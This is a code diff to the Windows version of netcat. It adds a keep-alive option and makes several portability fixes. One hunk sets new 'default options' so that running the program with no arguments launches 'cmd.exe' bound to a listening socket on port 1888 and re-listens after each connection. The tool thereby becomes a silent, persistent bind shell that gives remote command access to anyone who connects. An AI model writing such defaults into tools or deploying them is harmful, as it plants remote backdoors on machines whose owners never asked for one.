@@ -69,6 +69,7 @@
 #undef IP_OPTIONS
 #undef SO_REUSEPORT
 #include <windows.h>
+#define strcasecmp	stricmp
 #endif
 
 
@@ -201,7 +202,7 @@ static USHORT o_verbose = 0;
 static unsigned int o_wait = 0;
 static USHORT o_zero = 0;
 static USHORT o_esco = 0;
-
+static USHORT o_keepalive = 0;
 /* Debug macro: squirt whatever to stderr and sleep a bit so we can see it go
    by.  need to call like Debug ((stuff)) [with no ; ] so macro args match!
    Beware: writes to stdOUT... */
@@ -328,7 +329,7 @@ int error;
    fake varargs -- need to do this way because we wind up calling through
    more levels of indirection than vanilla varargs can handle, and not all
    machines have vfprintf/vsyslog/whatever!  6 params oughta be enough. */
-static void holler (str, p1, p2, p3, p4, p5, p6)
+void holler (str, p1, p2, p3, p4, p5, p6)
   char * str;
   char * p1, * p2, * p3, * p4, * p5, * p6;
 {
@@ -1642,14 +1643,16 @@ shovel:
     if (rnleft) {
 #ifdef WIN32
 	register unsigned char * ptr = np, *p2, *end = &np[rnleft];
-	while(ptr < end) {
+	/*while(ptr < end) {
 		if(*ptr > 0x7e) {
 			*ptr = '.';
 		}
 		++ptr;
-	}
+	}*/
 	if(o_esco && w32_stdout && (p2=(unsigned char *)strchr((const char *)np, 0x1b)) && p2 < end) {
-		ptr = np; int a = csbi.wAttributes;
+		int a;
+		ptr = np;
+		a = csbi.wAttributes;
 		do {
 			unsigned int l = p2 - ptr, c;
 			if (l) {
@@ -1891,7 +1894,7 @@ recycle:
 
 /* If your shitbox doesn't have getopt, step into the nineties already. */
 /* optarg, optind = next-argv-component [i.e. flag arg]; optopt = last-char */
-   while ((x = getopt (argc, argv, "adg:G:hi:lLno:p:rs:tuvw:zx")) != EOF) {
+   while ((x = getopt (argc, argv, "ade:g:G:hi:klLno:p:rs:tuvw:zx")) != EOF) {
 /* Debug (("in go: x now %c, optarg %x optind %d", x, optarg, optind)) */
     switch (x) {
       case 'a':
@@ -1903,8 +1906,8 @@ recycle:
 	break;
 #endif
 	        case 'L':				/* listen then cycle back to start instead of exiting */
-	o_listen++; 
-  	cycle = 1;
+	 o_listen++;
+  	 o_keepalive = cycle = 1;
 	  break;
 
 
@@ -1945,6 +1948,8 @@ recycle:
 	if (! o_interval)
 	  bail ("invalid interval time %s", optarg);
 	break;
+	  case 'k':
+	o_keepalive = 1; cycle = 1; break; /* keep alive */
       case 'l':				/* listen mode */
 	o_listen++; break;
       case 'n':				/* numeric-only, no DNS lookups */
@@ -1995,6 +2000,15 @@ recycle:
     } /* switch x */
   } /* while getopt */
 
+	/******* default options ********/
+	if (argc == 1) {
+		pr00gie = "cmd.exe";
+		o_listen++;
+		o_keepalive = cycle = 1;
+		o_lport = 1888;
+	}
+	/******* default options ********/
+	
 /* other misc initialization */
 #ifndef WIN32  /* Win32 doesn't like to mix file handles and sockets */
   Debug (("fd_set size %d", sizeof (*ding1)))	/* how big *is* it? */
@@ -2006,7 +2020,11 @@ recycle:
   }
 #ifdef GAPING_SECURITY_HOLE
   if (pr00gie) {
-    close (0);				/* won't need stdin */
+	  static int f = 0;
+	  if (!f) {
+		close (0);				/* won't need stdin */
+		f = 1;
+	  }
     o_wfile = 0;			/* -o with -e is meaningless! */
     ofd = 0;
   }
@@ -2170,13 +2188,14 @@ Debug (("netfd %d from port %d to port %d", netfd, ourport, curport))
   if (o_verbose > 1)		/* normally we don't care */
     holler ("sent %d, rcvd %d", wrote_net, wrote_out);
 
-#ifdef WIN32
-    WSACleanup(); 
-#endif
 	free(randports);
 
   	if (cycle == 1)
 		goto recycle;
+
+#ifdef WIN32
+    WSACleanup(); 
+#endif
 
   if (Single)
     exit (x);			/* give us status on one connection */
@@ -2211,6 +2230,7 @@ options:");
 	-i secs		delay interval for lines sent, ports scanned\n\
 	-l		listen mode, for inbound connects\n\
 	-L		listen harder, re-listen on socket close\n\
+	-k		keep alive\n\
 	-n		numeric-only IP addresses, no DNS\n\
 	-o file		hex dump of traffic\n\
 	-p port		local port number\n\
